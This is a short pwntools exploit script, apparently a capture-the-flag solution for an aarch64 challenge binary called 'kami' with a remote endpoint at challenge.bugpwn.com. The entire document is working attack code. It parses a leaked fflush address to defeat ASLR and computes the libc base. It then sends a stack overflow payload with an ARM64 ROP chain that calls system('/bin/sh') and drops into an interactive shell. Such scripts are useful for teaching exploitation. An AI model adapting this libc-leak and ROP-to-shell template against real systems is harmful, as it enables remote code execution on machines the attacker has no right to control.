from pwn import *

binary = context.binary = ELF('deploy/source/kami')
libc = ELF('/usr/aarch64-linux-gnu/lib/libc.so.6')



sh = process(('stdbuf -i0 -o0 -e0 qemu-'+context.arch+' -L /usr/'+context.arch+'-linux-gnu deploy/source/kami').split())

if args.REMOTE:
	sh = remote('challenge.bugpwn.com', 1000)

sh.recvuntil(b'fflush at ')



_ = sh.recvline().strip().decode()
fflushh = int(_,16)

libc.address = fflushh - libc.sym.fflush
log.info('fflush.address: ' + hex(fflushh))
log.info('libc.address: ' + hex(libc.address))

payload = b'A' * (128+8)
payload += p64(libc.search(asm('ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;')).__next__())
payload += (8 * 3) * b'C'
payload += p64(libc.search(asm('mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;')).__next__())
payload += p64(libc.search(b"/bin/sh").__next__())
payload += (8 * 2) * b'D'
payload += p64(libc.sym.system)

sh.sendlineafter('battleCTF.!',payload)
sh.interactive()
